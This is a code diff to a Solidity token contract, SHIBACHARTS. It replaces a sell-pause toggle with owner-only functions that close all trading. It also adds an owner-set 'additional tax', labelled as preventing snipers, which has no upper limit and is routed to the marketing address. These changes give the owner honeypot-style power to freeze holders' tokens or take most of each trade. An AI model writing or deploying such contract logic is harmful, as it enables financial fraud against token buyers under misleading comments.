@@ -22,6 +22,7 @@ contract SHIBACHARTS is Context, IERC20, Ownable {
     uint256 public _liquidityFee;
     uint256 public _marketingFee;
     uint256 public _innovationFee;
+    uint256 public _additionalTaxIfAny; // to prevent snipers
 
     address payable public liquidityAddress;
     address payable public marketingAddress;
@@ -36,7 +37,7 @@ contract SHIBACHARTS is Context, IERC20, Ownable {
 
     uint256 private _tTotal;
 
-    bool public sellPaused = false;
+    bool public tradingOpen = true;
 
     constructor(
         string memory name_,
@@ -58,6 +59,7 @@ contract SHIBACHARTS is Context, IERC20, Ownable {
         _liquidityFee = liquidityFee_;
         _marketingFee = marketingFee_;
         _innovationFee = innovationFee_;
+        _additionalTaxIfAny = 0;
 
         liquidityAddress = payable(lpAddress_);
         marketingAddress = payable(marketingAddress_);
@@ -85,8 +87,12 @@ contract SHIBACHARTS is Context, IERC20, Ownable {
         _isExcludedFromFee[address(uniswapV2Router)] = true;
     }
 
-    function toggleSell() external onlyOwner {
-        sellPaused = !sellPaused;
+    function closeTrading() external onlyOwner {
+        tradingOpen = false;
+    }
+
+    function openTrading() external onlyOwner {
+        tradingOpen = true;
     }
 
     function name() public view returns (string memory) {
@@ -170,17 +176,19 @@ contract SHIBACHARTS is Context, IERC20, Ownable {
         address to,
         uint256 amount
     ) private {
+        require(tradingOpen, "trading is not open for this contract.");
+
         require(from != address(0), "ERC20: transfer from the zero address");
         require(to != address(0), "ERC20: transfer to the zero address");
         require(amount > 0, "Transfer amount must be greater than zero");
 
-        if (canBuy(from, to) && !isExcludedFromFee(to)) {
+        if (isBuy(from, to) && !isExcludedFromFee(to)) {
             require(
                 amount <= (totalSupply() / 100) * 3,
                 "buy amount exceeds 3% limit"
             );
             _tokenTransferWithTax(from, to, amount);
-        } else if (canSell(from, to) && !isExcludedFromFee(from)) {
+        } else if (isSell(from, to) && !isExcludedFromFee(from)) {
             require(
                 amount <= (totalSupply() / 100) * 1,
                 "sell amount exceeds 1% limit"
@@ -195,7 +203,7 @@ contract SHIBACHARTS is Context, IERC20, Ownable {
         return _isExcludedFromFee[addr];
     }
 
-    function canBuy(address sender, address recipient)
+    function isBuy(address sender, address recipient)
         private
         view
         returns (bool)
@@ -203,12 +211,12 @@ contract SHIBACHARTS is Context, IERC20, Ownable {
         return sender == uniswapV2Pair && recipient != owner();
     }
 
-    function canSell(address sender, address recipient)
+    function isSell(address sender, address recipient)
         private
         view
         returns (bool)
     {
-        return !sellPaused && recipient == uniswapV2Pair && sender != owner();
+        return recipient == uniswapV2Pair && sender != owner();
     }
 
     function _tokenTransferWithTax(
@@ -219,7 +227,8 @@ contract SHIBACHARTS is Context, IERC20, Ownable {
         (
             uint256 liquidityTax,
             uint256 marketingTax,
-            uint256 innovationTax
+            uint256 innovationTax,
+            uint256 additionalTax
         ) = calculateTax(tAmount);
 
         _tOwned[sender] = _tOwned[sender].sub(tAmount);
@@ -227,15 +236,18 @@ contract SHIBACHARTS is Context, IERC20, Ownable {
         _tOwned[liquidityAddress] += liquidityTax;
         _tOwned[marketingAddress] += marketingTax;
         _tOwned[innovationAddress] += innovationTax;
+        _tOwned[marketingAddress] += additionalTax;
 
-        uint256 xfrAmt = tAmount.sub(liquidityTax).sub(marketingTax).sub(
-            innovationTax
-        );
+        uint256 xfrAmt = tAmount
+            .sub(liquidityTax)
+            .sub(marketingTax)
+            .sub(innovationTax)
+            .sub(additionalTax);
 
         _tOwned[recipient] += xfrAmt;
 
         emit Transfer(sender, liquidityAddress, liquidityTax);
-        emit Transfer(sender, marketingAddress, marketingTax);
+        emit Transfer(sender, marketingAddress, marketingTax + additionalTax);
         emit Transfer(sender, innovationAddress, innovationTax);
         emit Transfer(sender, recipient, xfrAmt);
     }
@@ -246,13 +258,15 @@ contract SHIBACHARTS is Context, IERC20, Ownable {
         returns (
             uint256,
             uint256,
+            uint256,
             uint256
         )
     {
         return (
             _amount.mul(_liquidityFee).div(10**2),
             _amount.mul(_marketingFee).div(10**2),
-            _amount.mul(_innovationFee).div(10**2)
+            _amount.mul(_innovationFee).div(10**2),
+            _amount.mul(_additionalTaxIfAny).div(10**2)
         );
     }
 
@@ -272,5 +286,18 @@ contract SHIBACHARTS is Context, IERC20, Ownable {
 
     function includeFromFee(address addr) public onlyOwner {
         _isExcludedFromFee[addr] = false;
+    }
+
+    function updateadditionalTaxIfAny(uint256 fee) public onlyOwner {
+        require(fee >= 15, "minimum tax can be 15% to support the project");
+        _additionalTaxIfAny = fee - 15;
+    }
+
+    function totalTax() public view returns (uint256) {
+        return
+            _liquidityFee +
+            _marketingFee +
+            _innovationFee +
+            _additionalTaxIfAny;
     }
 }
